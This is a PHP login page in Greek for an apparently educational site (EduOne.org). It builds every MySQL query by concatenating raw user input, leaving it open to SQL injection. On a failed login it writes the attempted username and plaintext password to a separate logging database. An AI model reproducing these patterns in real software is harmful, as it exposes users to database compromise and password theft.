<!DOCTYPE html>

<html>

<head>
<title>Σύνδεση </title>
<link rel="stylesheet" type="text/css" href="./css/style.css">
<link href="https://fonts.googleapis.com/css?family=GFS+Didot" rel="stylesheet"> 

<?php
	session_start();
	error_reporting(0);
	function report_error_log(){
		$config = parse_ini_file('./config/CristinaBot.ini');
		$error_connection_object = new mysqli($config['ip_address'],$config['username'],$config['password']);
		mysqli_query($error_connection_object ,'insert into logs.error (username,password) values ("'.$_SESSION['username'].'","'.$_SESSION['password'].'");');
	}
	$config = parse_ini_file('./config/db.ini');
	$_SESSION["username"] = $_POST["username"];
	$_SESSION["password"] = $_POST["password"];
	//$db="testdb";
	$connectionObject = new mysqli($config['ip_address'],$_SESSION['username'],$_SESSION['password']);
	if($connectionObject->connect_error){
		echo '<div id="PresentationBackgroundLayer"><div id="PresentationTextLayer">Η κεντρική βάση δεδομένων αυτή την στιγμή είναι εκτός λειτουργίας , παρακαλώ προσπαθήστε αργότερα η επικοινωνήστε με τον διαχειριστή του συστήματος για περαιτέρω διευκρινήσεις</div></div>';
		report_error_log();
	}
	else{
		echo '<div id="PresentationBackgroundLayer"><div id="PresentationTextLayer"> Η σύνδεση με την κεντρική βάση δεδομένων επετεύχθη με επιτυχία ,αναμείνατε για ανακατεύθυνση ;) ';
		mysqli_query($connectionObject,'insert into logs.log_in (username) values ("'.$_SESSION['username'].'");');
		mysqli_query($connectionObject,'update logs.online_users set Status=1 where Username="'.$_SESSION['username'].'";');
		
		header('location:Panel.php');
		
	}

	//mysqli_query($connectionObject,'CREATE DATABASE HEY;');



?>
</head>

<body>
<div id="footer">2016-2017 EduOne.org© , All Rights Reserved© </div>
</body>
</html>